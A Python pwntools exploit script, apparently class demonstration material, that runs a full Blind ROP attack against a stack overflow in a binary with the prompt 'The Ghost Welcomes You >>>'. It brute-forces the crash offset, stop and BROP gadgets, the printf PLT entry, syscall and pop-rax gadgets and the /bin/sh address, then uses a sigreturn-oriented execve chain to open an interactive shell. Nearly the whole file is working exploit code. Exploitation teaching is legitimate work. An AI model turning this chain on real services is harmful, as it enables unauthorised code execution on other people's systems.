from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
continue
'''

'''
For class demonstration purposes, limit the search space
so discoveries are quickly displayed
'''
OFFSET_MIN = 1
OFFSET_MAX = 100
STOP_GADGET_MIN = e.sym['logo']-10
STOP_GADGET_MAX = STOP_GADGET_MIN + 100
BROP_GADGET_MIN = e.sym['__libc_csu_init']+80
BROP_GADGET_MAX = BROP_GADGET_MIN + 100
PLT_MIN = e.plt['printf'] - 10
PLT_MAX = PLT_MIN + 20
TEXT_MIN = e.sym['gadgets']
TEXT_MAX = TEXT_MIN + 100
DATA_MIN = 0x400ca0
DATA_MAX = DATA_MIN+20000


def check_addr(addr):
    bad_addr = ['0a']
    for b in bad_addr:
        if b in hex(addr):
            return False
    return True


def start():
    if (args.QEMU and args.GDB):
        p=process(['qemu-amd64', '-g', '1234', e.path])
        gdb.attach(target=('localhost',1234), exe=e.path, gdbscript=gs)
        return p
    elif (args.QEMU):
        return process(['qemu-amd64', e.path])
    elif args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    else:
        return process(e.path)


def find_offset():
    for i in range(OFFSET_MIN, OFFSET_MAX):
        log.info('\tTrying to crash program with %i bytes' % i)
        with context.quiet:
            p = start()
            p.sendlineafter(b'The Ghost Welcomes You >>>', cyclic(i))
            try:
                p.recvline()
            except EOFError:
                return int(i/8)*8


def find_stop_gadget():
    for i in range(STOP_GADGET_MIN, STOP_GADGET_MAX):
        if check_addr(i):
            log.info('\tTesting for stop gadget at 0x%x' % i)
            with context.quiet:
                p = start()
                chain = cyclic(offset)
                chain += p64(i)
                chain += p64(i+1)
                p.sendlineafter(b'The Ghost Welcomes You >>>', chain)
                try:
                    resp = p.recvline()
                    if b'\n' in resp:
                        return i
                except EOFError:
                    pass


def find_brop_gadget():
    for i in range(BROP_GADGET_MIN, BROP_GADGET_MAX):
        log.info('\tTesting for brop gadget at 0x%x' % i)
        with context.quiet:
            p = start()
            chain = cyclic(offset)
            chain += p64(stop_gadget)
            chain += p64(i)
            chain += p64(0xdeadbeef)*6
            chain += p64(stop_gadget)
            chain += p64(stop_gadget+1)
            p.sendlineafter(b'The Ghost Welcomes You >>>', chain)
            try:
                resp = p.recvline()
                if resp:
                    return i
            except EOFError:
                pass


def find_printf_plt():
    for i in range(PLT_MIN, PLT_MAX):
        log.info('\tTesting for printf PLT at 0x%x' % i)
        with context.quiet:
            p = start()
            chain = cyclic(offset)
            chain += p64(ret)
            chain += p64(pop_rdi)
            chain += p64(i)
            chain += p64(i)
            p.sendlineafter(b'The Ghost Welcomes You >>>', chain)
            try:
                resp = p.recvline()
                if b'\xff' in resp:
                    return i
            except EOFError:
                pass


def leak_gadgets():
    syscall = 0x0
    pop_rax_ret = 0x0
    for i in range(TEXT_MIN, TEXT_MAX):
        with context.quiet:
            p = start()
            chain = cyclic(offset)
            chain += p64(ret)
            chain += p64(pop_rdi)
            chain += p64(i)
            chain += p64(printf_plt)
            p.sendlineafter(b'The Ghost Welcomes You >>>', chain)
            try:
                resp = p.recvline()
                print("\tFinding Gadgets at Addr: %s, Data: %s" %
                      (hex(i), disasm(resp, vma=(i-1))))
                if (asm('syscall') in resp):
                    syscall = (i-1)+resp.index(asm('syscall'))
                elif (asm('pop rax; ret;') in resp):
                    pop_rax_ret = (i-1)+resp.index(asm('pop rax; ret;'))
                if (syscall != 0 and pop_rax_ret != 0):
                    return syscall, pop_rax_ret
            except:
                pass


def discover_bin_sh():
    addr = DATA_MIN
    while (addr < DATA_MAX):
        try:
            with context.quiet:
                p = start()
                chain = cyclic(offset)
                chain += p64(ret)
                chain += p64(pop_rdi)
                chain += p64(addr)
                chain += p64(printf_plt)
                p.sendlineafter(b'The Ghost Welcomes You >>>', chain)
                data = p.recvline()
                if data:
                    print("\tAddr: %s, Data: %s" % (hex(addr-1), data))
                    if (b'/bin/sh' in data):
                        binsh = (addr-1)+data.index(b'/bin/sh')
                        return binsh
                addr += len(data)
        except:
            addr += 1


''' srop since i have pop_rax, syscall '''


def srop_exec():
    p = start()
    chain = cyclic(offset)
    chain += p64(pop_rax)
    chain += p64(0xf)
    chain += p64(syscall)
    frame = SigreturnFrame(arch="amd64", kernel="amd64")
    frame.rax = constants.SYS_execve
    frame.rdi = bin_sh
    frame.rip = syscall
    p.sendlineafter(b'The Ghost Welcomes You >>>', chain+bytes(frame))
    p.interactive()


offset = find_offset()
log.info('Discovered offset = %i' % offset)
pause()

stop_gadget = find_stop_gadget()
log.info('Discovered stop gadget = 0x%x' % stop_gadget)
pause()

brop_gadget = find_brop_gadget()
log.info('brop gagdet  = 0x%x' % brop_gadget)
pop_rdi = brop_gadget + 13
ret = pop_rdi + 1
log.info('pop rdi, ret = 0x%x' % pop_rdi)
log.info('ret = 0x%x' % ret)
pause()

printf_plt = find_printf_plt()
log.info('printf plt entry = 0x%x' % printf_plt)
pause()

syscall, pop_rax = leak_gadgets()
log.info('pop rax, ret = 0x%x' % pop_rax)
log.info('syscall = 0x%x' % syscall)
pause()

bin_sh = discover_bin_sh()
log.info('bin/sh = 0x%x' % bin_sh)
pause()

log.info('throwing SROP exploit at the ghost')
srop_exec()
